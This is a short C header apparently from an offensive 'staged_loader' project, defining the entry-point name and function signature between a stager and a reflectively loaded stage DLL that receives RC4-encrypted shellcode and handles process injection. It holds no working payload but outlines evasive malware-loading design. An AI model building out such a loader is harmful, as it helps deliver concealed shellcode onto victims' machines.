/*
 * staged_loader stage ABI - the contract between the on-disk stager (stager.c)
 * and the reflectively-mapped stage DLL (loader.c).
 *
 * The stager maps the decrypted stage image, resolves STAGED_LOADER_ENTRY from
 * its export table and calls it with the command line plus the still
 * RC4-encrypted shellcode blob/key. The stage owns the CLI, the service
 * dispatcher and the injection logic; the stager only bootstraps.
 *
 * Keep the entry name and the function signature here so the two sides
 * cannot drift apart unnoticed.
 */
#ifndef STAGED_LOADER_STAGE_ABI_H
#define STAGED_LOADER_STAGE_ABI_H

#include <stddef.h>
#include <wchar.h>

#define STAGED_LOADER_ENTRY "StageMain"

typedef int(__cdecl *staged_loader_main_fn)(int argc, wchar_t **argv,
                                        const unsigned char *enc_payload,
                                        size_t enc_payload_len,
                                        const unsigned char *key,
                                        size_t key_len);

#endif /* STAGED_LOADER_STAGE_ABI_H */
